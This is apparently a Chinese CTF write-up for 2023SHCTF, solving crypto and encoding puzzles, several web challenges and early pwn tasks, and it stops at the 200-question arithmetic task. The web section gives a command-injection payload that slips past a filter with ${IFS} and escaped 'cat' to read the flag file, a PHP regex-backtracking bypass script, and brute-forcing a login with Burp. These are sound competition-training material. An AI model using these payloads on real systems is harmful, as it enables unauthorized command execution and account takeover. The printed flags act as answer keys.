<h3 id="really-ez-rsa"><a href="#really-ez-rsa" class="headerlink" title="really_ez_rsa"></a>really_ez_rsa</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, bytes_to_long</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">m = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">128</span>)</span><br><span class="line">q = getPrime(<span class="number">128</span>)</span><br><span class="line">n = p * q</span><br><span class="line">m = bytes_to_long(m)</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;p =&quot;</span>, p)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;q =&quot;</span>, q)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c =&quot;</span>, c)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;e =&quot;</span>, e)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = 217873395548207236847876059475581824463</span></span><br><span class="line"><span class="comment"># q = 185617189161086060278518214521453878483</span></span><br><span class="line"><span class="comment"># c = 6170206647205994850964798055359827998224330552323068751708721001188295410644</span></span><br><span class="line"><span class="comment"># e = 65537</span></span><br></pre></td></tr></table></figure>

<p>p,q都给了，白给</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">p = <span class="number">217873395548207236847876059475581824463</span></span><br><span class="line">q = <span class="number">185617189161086060278518214521453878483</span></span><br><span class="line">c = <span class="number">6170206647205994850964798055359827998224330552323068751708721001188295410644</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,p*q)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="comment">#flag&#123;Y0ung_meiyou_xiaojj&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="what-is-m"><a href="#what-is-m" class="headerlink" title="what_is_m"></a>what_is_m</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;m =&quot;</span>,m)</span><br><span class="line"></span><br><span class="line"><span class="comment"># m = 7130439814057451234816276827985624426378225444820448794672983850703174510423869748080084641434692304059989810437801952820137016591528446065914779069356815372089481476999952029232464963781245</span></span><br></pre></td></tr></table></figure>

<p>更加白给，转字节就行了</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">m = <span class="number">7130439814057451234816276827985624426378225444820448794672983850703174510423869748080084641434692304059989810437801952820137016591528446065914779069356815372089481476999952029232464963781245</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="comment">#flag&#123;Th3r3_ar3_53vEraL_a1terNAtIvEs_7o_tHe_1ON9_T0_6YteS_1UNCti0N_dCGb796e3dSB&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="残缺的md5"><a href="#残缺的md5" class="headerlink" title="残缺的md5"></a>残缺的md5</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">苑晴在路边捡到了一张纸条，上面有一串字符串：KCLWG?K8M9O3?DE?84S9</span><br><span class="line">问号是被污染的部分，纸条的背面写着被污染的地方为大写字母，还给了这串字符串的md5码值：F0AF????B1F463????F7AE???B2AC4E6</span><br><span class="line">请提交完整的md5码值并用flag&#123;&#125;包裹提交</span><br></pre></td></tr></table></figure>

<p>爆就完了</p>
<p>exp:</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">s = <span class="string">&quot;KCLWG?K8M9O3?DE?84S9&quot;</span></span><br><span class="line">table = string.ascii_letters + string.digits</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>):</span><br><span class="line">            ss = <span class="string">&quot;KCLWG&quot;</span> + <span class="built_in">chr</span>(i) + <span class="string">&quot;K8M9O3&quot;</span> + <span class="built_in">chr</span>(j) + <span class="string">&quot;DE&quot;</span> + <span class="built_in">chr</span>(k) + <span class="string">&quot;84S9&quot;</span></span><br><span class="line">            <span class="built_in">hash</span> = hashlib.md5(ss.encode()).hexdigest().upper()</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">hash</span>[:<span class="number">4</span>] == <span class="string">&quot;F0AF&quot;</span> <span class="keyword">and</span> <span class="built_in">hash</span>[-<span class="number">7</span>:] == <span class="string">&quot;B2AC4E6&quot;</span> <span class="keyword">and</span> <span class="string">&quot;B1F463&quot;</span> <span class="keyword">in</span> <span class="built_in">hash</span>:</span><br><span class="line">                flag = <span class="string">&quot;flag&#123;&quot;</span> + <span class="built_in">hash</span> + <span class="string">&quot;&#125;&quot;</span></span><br><span class="line">                flag1 = <span class="string">&quot;flag&#123;&quot;</span> + ss + <span class="string">&quot;&#125;&quot;</span></span><br><span class="line">                <span class="built_in">print</span>(flag)</span><br><span class="line">                <span class="built_in">print</span>(flag1)</span><br><span class="line">                </span><br><span class="line"><span class="comment">#flag&#123;F0AF1443B1F463EAFFF7AEBB8B2AC4E6&#125;</span></span><br><span class="line"><span class="comment">#flag&#123;KCLWGXK8M9O3KDED84S9&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="电信诈骗"><a href="#电信诈骗" class="headerlink" title="电信诈骗"></a>电信诈骗</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">050f000a7e407151537802540b747176075178027552756d0256726262627c</span><br><span class="line">你好，我是秦始皇，我并没有死，我得到了长生不老药，但是药效有副作用，现在才醒。我刚花了一年在互联网上了解现在的时代，现在我要利用我地宫第四行第七列的无敌兵马俑军队卷土重来，但是我需要启动资金，vivo50作为启动资金，待我横扫天下，封你为大将军，赏你黄金万两！</span><br></pre></td></tr></table></figure>

<p>先把这个16进制转字节</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">c = <span class="string">&quot;050f000a7e407151537802540b747176075178027552756d0256726262627c&quot;</span></span><br><span class="line">cc = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">bytes</span>.fromhex(c):</span><br><span class="line">    cc.append(i)</span><br><span class="line"><span class="built_in">print</span>(cc)</span><br></pre></td></tr></table></figure>

<p>得到这个数组<code>[5, 15, 0, 10, 126, 64, 113, 81, 83, 120, 2, 84, 11, 116, 113, 118, 7, 81, 120, 2, 117, 82, 117, 109, 2, 86, 114, 98, 98, 98, 124]</code></p>
<p>提示给出$47$和$50$两个数字，拿部分明文<code>flag&#123;</code>进行各种运算，最后发现每个明文字符和密文字符异或$50$的差值都是$47$，即<code>47 = m[i] - (cc[i] ^ 50)</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">m = <span class="string">b&quot;flag&#123;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    <span class="built_in">print</span>(m[i] - (cc[i] ^ <span class="number">50</span>))</span><br></pre></td></tr></table></figure>

<p>所以<code>m[i] = cc[i] ^ 50</code>，这样就能恢复明文</p>
<p>但是！就这样操作的话，得到的是：<code>flag&#123;¡ry_hursdy_vv_o&#125;</code>，很明显有一些字符没有打出来</p>
<p>有一些明文的值是超出范围的，因为我们需要的值是在33~126中</p>
<p>所以要对超出126的值进行处理，把每个<code>m</code>的值打印出来</p>
<p>找一下规律发现，<code>vv</code>此处应该是<code>vivo</code>或者<code>v1v0</code>或者<code>viv0</code>或者<code>v1vo</code>，通过这样来找寻规律，最后通过<code>v1v0</code>找到了规律，要把超过126的值减去94</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">c = <span class="string">&quot;050f000a7e407151537802540b747176075178027552756d0256726262627c&quot;</span></span><br><span class="line">cc = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">bytes</span>.fromhex(c):</span><br><span class="line">    cc.append(i)</span><br><span class="line"><span class="built_in">print</span>(cc)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cc)):</span><br><span class="line">    mm = <span class="number">47</span> + (cc[i] ^ <span class="number">50</span>)</span><br><span class="line">    <span class="keyword">if</span> mm &gt; <span class="number">126</span>:</span><br><span class="line">        mm -= <span class="number">94</span></span><br><span class="line">        flag += <span class="built_in">chr</span>(mm)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag += <span class="built_in">chr</span>(mm)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#flag&#123;Cr42y_7hursd4y_v1v0_5o!!!&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="佛说：只能四天"><a href="#佛说：只能四天" class="headerlink" title="佛说：只能四天"></a>佛说：只能四天</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">陀即我叻我莊如亦婆愍降吽兜哉念色夷嚩喼哉宣宣羅僧慧喼喃塞修菩哉菩哉吶宣囉哆念隸是喃哉嚩是念哉我嘚般訶尊是是闍哉訶咤聞訶念兜喼哉是般哉尊波祗迦念彌哆塞咤寂祗蜜劫塞迦劫諸隸菩哉缽即哉耨若夷夷吽斯空須囉諦諸須塞缽是若咤劫若哉嚴莊須哉闍須叻耨降菩哉般哆哉耨是叻色迦羅缽哉吽哉降聞叻彌蜜彌所斯嚴薩所陀波婆喃夷愍所囉哉叻伏空般耨囉隸劫般夷降嘇慧哆摩我念羅哉摩修叻喼羅般須吶囉尊伏斯若喼羅</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="http://hi.pcmoe.net/buddha.html">新约佛论禅解密</a>得到<code>和谐公正和谐公正和谐法治和谐公正和谐法治和谐公正和谐平等和谐公正和谐公正和谐法治和谐公正和谐公正和谐公正和谐民主自由平等和谐敬业和谐和谐自由敬业自由敬业和谐和谐自由敬业和谐富强和谐敬业和谐爱国和谐公正和谐公正和谐公正和谐法治和谐公正和谐公正和谐公正和谐公正和谐公正和谐公正和谐法治和谐法治自由公正和谐法治自由法治和谐和谐和谐敬业自由爱国和谐民主和谐和谐自由法治自由公正和谐和谐自由法治</code></p>
<p><a target="_blank" rel="noopener" href="http://www.hiencode.com/cvencode.html">核心价值观解码</a>得到<code>66767656676661E93II3I098666766666677F7G39H13GF3G</code></p>
<p>一看很像16进制但是出现了<code>G</code>,<code>H</code>，估计要用凯撒，但是对比flag的十六进制是<code>666c6167</code>顺序似乎不对</p>
<p>先<a target="_blank" rel="noopener" href="https://www.qqxiuzi.cn/bianma/zhalanmima.php">栅栏解密</a>得到<code>666F61677E6G697373696I6H5I6163636I6G706F6973687G</code>，栅栏数为4，这样子和明文只差移位了</p>
<p><a target="_blank" rel="noopener" href="https://www.qqxiuzi.cn/bianma/kaisamima.php">凯撒解密</a>，移位量为<code>3</code>，得到<code>666C61677B6D697373696F6E5F6163636F6D706C6973687D</code></p>
<p>16进制转字符<code>flag&#123;mission_accomplish&#125;</code></p>
<h3 id="黑暗之歌"><a href="#黑暗之歌" class="headerlink" title="黑暗之歌"></a>黑暗之歌</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">密文：</span><br><span class="line"></span><br><span class="line">⠴⡰⡭⡳⠴⡰⡭⡰⡷⡲⡢⡩⡭⡡⠯⡩⡭⡡⡺⡩⡭⡡⠳⡩⡭⡡⡺⡩⡭⡡⡶⡩⡭⡡⡶⡩⡭⡡⡲⡩⡭⡡⡺⡩⡭⡡⠯⡩⡧⡊⡢⡩⡭⡡⠯⡩⡭⡡⡺⡃⡰⠫⡋⡚⡲⡍⡋⡮⠴⡰⡭⡶⡷⡲⡢⡩⡧⡊⡢⡃⡴⡵⡋⡁⡬⡵⡋⡁⡬⡵⡋⡁⡬⡳⡋⠲⠴⡯⡃⡗⠴⡰⡭⡴⠴⡰⡭⡶⡷⡲⡢⡩⡧⡊⡢⡩⡭⡡⡺⡩⡭⡡⡺⡩⡭⡡⠳⡩⡧⡊⡢⡩⡭⡡⠯⡩⡧⡊⡢⡃⡴⡵⡋⡚⡱⠫⡋⡚⡱⠫⡋⡚⡲⠵⠲⡺⠰⠽</span><br></pre></td></tr></table></figure>

<p>一眼盲文，找了很多网站解的都怪怪的，最后找到<a target="_blank" rel="noopener" href="http://www.atoolbox.net/Tool.php?Id=837">盲文点字加密&#x2F;解密)</a>，解密得到：</p>
<p><code>4pms4pmpwrbima/imazima3imazimavimavimarimazima/igJbima/imazCp+KZrMKn4pmvwrbigJbCtuKAluKAluKAlsK24oCW4pmt4pmvwrbigJbimazimazima3igJbima/igJbCtuKZq+KZq+KZrz0=</code></p>
<p>base64解密得到<code>♬♩¶♯♬♭♬♫♫♪♬♯‖♯♬§♬§♯¶‖¶‖‖‖¶‖♭♯¶‖♬♬♭‖♯‖¶♫♫♯=</code></p>
<p><a target="_blank" rel="noopener" href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=yinyue">音符解密</a>得到<code>flag&#123;b2cc-9091-8a29&#125;</code></p>
<h3 id="进制"><a href="#进制" class="headerlink" title="进制"></a>进制</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">好熟悉的进制，但不知道加密了几层</span><br><span class="line">3636366336313637376236313638363636623661366336383662363136383764</span><br></pre></td></tr></table></figure>

<p>两层16进制</p>
<p><code>flag&#123;ahfkjlhkah&#125;flag&#123;ahfkjlhkah&#125;</code></p>
<h3 id="凯撒大帝"><a href="#凯撒大帝" class="headerlink" title="凯撒大帝"></a>凯撒大帝</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pvkq&#123;mredsrkyxkx&#125;</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://www.qqxiuzi.cn/bianma/kaisamima.php">凯撒解密</a>，移位量为10</p>
<p><code>flag&#123;chutihaonan&#125;</code></p>
<h3 id="立正"><a href="#立正" class="headerlink" title="立正"></a>立正</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wl hgrfhg 4gNUx4NgQgEUb4NC64NHxZLg636V6CDBiDNUHw8HkapH :jdoi vl vlkw  ~xrb wd nrrT Y:</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://www.qqxiuzi.cn/bianma/kaisamima.php">凯撒解密</a>，移位量为3得到<code>ti edoced 4dKRu4KdNdBRy4KZ64KEuWId636S6ZAYfAKREt8EhxmE :galf si siht  ~uoy ta kooQ V:</code></p>
<p>发现<code>edoced</code>，意识到要把它逆序<code>:V Qook at you~  this is flag: EmxhE8tERKAfYAZ6S636dIWuEK46ZK4yRBdNdK4uRKd4 decode it</code></p>
<p>观察中间的密文<code>EmxhE8tERKAfYAZ6S636dIWuEK46ZK4yRBdNdK4uRKd4</code>，对比<code>flag&#123;</code>的base64密文：<code>ZmxhZ3s</code></p>
<p>猜了很久最后知道，大写字母后移21位因为<code>E</code>–&gt;<code>Z</code>，小写字母不动，数字前移5位，因为<code>Qook at you</code>–&gt;<code>Look at you</code></p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">c = <span class="string">&quot;EmxhE8tERKAfYAZ6S636dIWuEK46ZK4yRBdNdK4uRKd4&quot;</span></span><br><span class="line">m = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">    <span class="keyword">if</span> c[i].isupper():</span><br><span class="line">        mm = <span class="number">65</span> + (<span class="built_in">ord</span>(c[i]) - <span class="number">65</span> + <span class="number">21</span>) % <span class="number">26</span> </span><br><span class="line">        m += <span class="built_in">chr</span>(mm)</span><br><span class="line">    <span class="keyword">if</span> c[i].isdigit():</span><br><span class="line">        mm = <span class="built_in">ord</span>(<span class="string">&#x27;0&#x27;</span>) + ((<span class="built_in">ord</span>(c[i]) - <span class="built_in">ord</span>(<span class="string">&#x27;0&#x27;</span>) -<span class="number">5</span>) % <span class="number">10</span>)</span><br><span class="line">        m += <span class="built_in">chr</span>(mm)</span><br><span class="line">    <span class="keyword">if</span> c[i].islower():</span><br><span class="line">        m += c[i]</span><br><span class="line">flag = base64.b64decode(m.encode())</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#flag&#123;Y0U_MU57_5t4nd_uP_r1gHt_n0W&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="迷雾重重"><a href="#迷雾重重" class="headerlink" title="迷雾重重"></a>迷雾重重</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">题目描述：</span><br><span class="line"></span><br><span class="line">morse？ASCII？</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">密文：</span><br><span class="line"></span><br><span class="line">0010 0100 01 110 1111011 11 111 010 000 0 001101 00 000 001101 0001 0 010 1011 001101 0010 001 10 1111101</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://www.lddgo.net/encrypt/morse">在线摩斯解密</a>，得到<code>FLAG&#123;MORSE_IS_VERY_FUN&#125;</code></p>
<p>忘了是大写还是小写</p>
<h3 id="难言的遗憾"><a href="#难言的遗憾" class="headerlink" title="难言的遗憾"></a>难言的遗憾</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">题目描述：</span><br><span class="line">我们本可以早些进入信息化时代的，但是清政府拒不采纳那份编码规则。 （注：flag为中文，使用flag&#123;&#125;包裹提交）</span><br><span class="line"></span><br><span class="line">密文：</span><br><span class="line"></span><br><span class="line">000111310008133175592422205314327609650071810649</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="http://code.mcdvisa.com/">中文电码查询 Chinese Commercial Code - 标准电报码免费在线查询|姓名电码|美国签证电码 (mcdvisa.com)</a></p>
<p><code>flag&#123;一天不学高数我就魂身难受&#125;</code></p>
<h3 id="小兔子可爱捏"><a href="#小兔子可爱捏" class="headerlink" title="小兔子可爱捏"></a>小兔子可爱捏</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">题目描述：宇宙的终极答案是什么？</span><br><span class="line"></span><br><span class="line">U2FsdGVkX1/lKCKZm7Nw9xHLMrKHsbGQuFJU5QeUdASq3Ulcrcv9</span><br><span class="line"></span><br><span class="line">你可能会需要一把钥匙，钥匙就是问题的答案。</span><br></pre></td></tr></table></figure>

<p>宇宙的终极答案是<code>42</code>，作为密钥，<a target="_blank" rel="noopener" href="http://www.jsons.cn/rabbitencrypt/">Rabbit解密</a></p>
<p><code>flag&#123;i_love_technology&#125;</code></p>
<h3 id="熊斐特"><a href="#熊斐特" class="headerlink" title="熊斐特"></a>熊斐特</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">熊斐特博士发现了一种新的密码。</span><br><span class="line">uozt&#123;zgyzhs xrksvi&#125;</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="http://www.practicalcryptography.com/ciphers/classical-era/atbash-cipher/">埃特巴什码</a></p>
<p><code>flag&#123;atbash cipher&#125;</code></p>
<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="babyRCE"><a href="#babyRCE" class="headerlink" title="babyRCE"></a>babyRCE</h3><p><img src="/../../images/2023SHCTF/0.png"></p>
<p>过滤了这么多字符，先用<code>?rce=ls</code>查看有什么文件</p>
<p><img src="/../../images/2023SHCTF/1.png"></p>
<p>翻了一个大佬的博客<a target="_blank" rel="noopener" href="https://c1oudfl0w0.github.io/blog/2023/07/26/MoeCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/#MoeCTF-2021-babyRCE">MoeCTF刷题记录 | 雲流のLowest World (c1oudfl0w0.github.io)</a></p>
<p>得知用<code>$&#123;IFS&#125;</code>代替空格，用<code>ca\t</code>代替<code>cat</code></p>
<p>payload:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?rce=ca\t$&#123;IFS&#125;fla?.php</span><br></pre></td></tr></table></figure>

<p>但是！里面没有内容</p>
<p>用<code>?rce=ls$&#123;IFS&#125;/</code>查看根目录</p>
<p><img src="/../../images/2023SHCTF/2.png"></p>
<p>发现flag在根目录，最终的payload:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?rce=ca\t$&#123;IFS&#125;/fla?</span><br></pre></td></tr></table></figure>

<p><code>flag&#123;662c515d-60c5-45a8-8a8c-86cee77e95a7&#125;</code></p>
<h3 id="飞机大战"><a href="#飞机大战" class="headerlink" title="飞机大战"></a>飞机大战</h3><p>一个网页小游戏，F12查看js文件</p>
<p>找到这个<code>won</code>函数，这串字符Unicode字符就是flag</p>
<p><img src="/../../images/2023SHCTF/3.png"></p>
<p>Unicode解码得到:<code>ZmxhZ3tkMTI0NDI4MS1jYjJjLTRmMjgtOWM0Ny1lOTcyM2YyMjNhMjF9</code></p>
<p>再base64解码：<code>flag&#123;d1244281-cb2c-4f28-9c47-e9723f223a21&#125;</code></p>
<h3 id="登录就给flag"><a href="#登录就给flag" class="headerlink" title="登录就给flag"></a>登录就给flag</h3><p><img src="/../../images/2023SHCTF/4.png"></p>
<p>用Burp Suite爆破账号密码</p>
<p><img src="/../../images/2023SHCTF/5.png"></p>
<p>选择爆破模式</p>
<p><img src="/../../images/2023SHCTF/6.png"></p>
<p>分别设置字典</p>
<p>最后发现账号是<code>admin</code>，密码是<code>password</code></p>
<p><code>flag&#123;925866f7-7753-4095-a900-9896c35a7988&#125;</code></p>
<h3 id="1zzphp"><a href="#1zzphp" class="headerlink" title="1zzphp"></a>1zzphp</h3><p><img src="/../../images/2023SHCTF/23.png"></p>
<p>第一层用空数组绕过，第二层用正则溢出绕过</p>
<p>参考：<a target="_blank" rel="noopener" href="https://c1oudfl0w0.github.io/blog/2023/03/15/PHP%E7%89%B9%E6%80%A7/#%E6%BA%A2%E5%87%BA%E7%BB%95%E8%BF%87"> 雲流のLowest World </a></p>
<p>exp:</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://112.6.51.212:32800/?num[]&quot;</span></span><br><span class="line"></span><br><span class="line">data = &#123;<span class="string">&#x27;c_ode&#x27;</span>: <span class="string">&#x27;very&#x27;</span> * <span class="number">250000</span> + <span class="string">&#x27;2023SHCTF&#x27;</span>&#125;</span><br><span class="line">res = requests.post(url, data=data)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure>

<h3 id="生成你的邀请函"><a href="#生成你的邀请函" class="headerlink" title="生成你的邀请函"></a>生成你的邀请函</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">API：url/generate_invitation  </span><br><span class="line">Request：POST application/json  </span><br><span class="line">Body：&#123;  </span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Yourname&quot;</span>,  </span><br><span class="line">    <span class="string">&quot;imgurl&quot;</span>: <span class="string">&quot;http://q.qlogo.cn/headimg_dl?dst_uin=QQnumb&amp;spec=640&amp;img_type=jpg&quot;</span>  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>

<p>使用POST json请求来生成你的邀请函吧<del>flag就在里面哦</del></p>
<p>用POSTMAN 传</p>
<p><img src="/../../images/2023SHCTF/24.png"></p>
<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h3><p><img src="/../../images/2023SHCTF/7.png"></p>
<p>nc上靶机，先<code>ls</code>看看有什么文件，发现有flag，直接<code>cat</code></p>
<h3 id="hard-nc"><a href="#hard-nc" class="headerlink" title="hard nc"></a>hard nc</h3><p><img src="/../../images/2023SHCTF/8.png"></p>
<p>先<code>ls</code>，再<code>cat</code>flag，发现flag不在这里</p>
<p>想到flag文件可能被隐藏了，输入<code>ls -a</code></p>
<p><img src="/../../images/2023SHCTF/9.png"></p>
<p>发现有个提示<code>gift</code>，查看后发现是一半的flag</p>
<p>试着看<code>gift2</code></p>
<p><img src="/../../images/2023SHCTF/10.png"></p>
<p>但是<code>gift2</code>是个目录，进入<code>gift2</code>，输入<code>ls</code>，发现有<code>flag2</code>，查看后发现是base64编码后的flag，解码即可</p>
<p><code>flag&#123;628975bc-8820-4a24-816f-99aa08049ce3&#125;</code></p>
<h3 id="口算题"><a href="#口算题" class="headerlink" title="口算题"></a>口算题</h3><p><img src="/../../images/2023SHCTF/11.png"></p>
<p>要答对200题，肯定得用脚本</p>
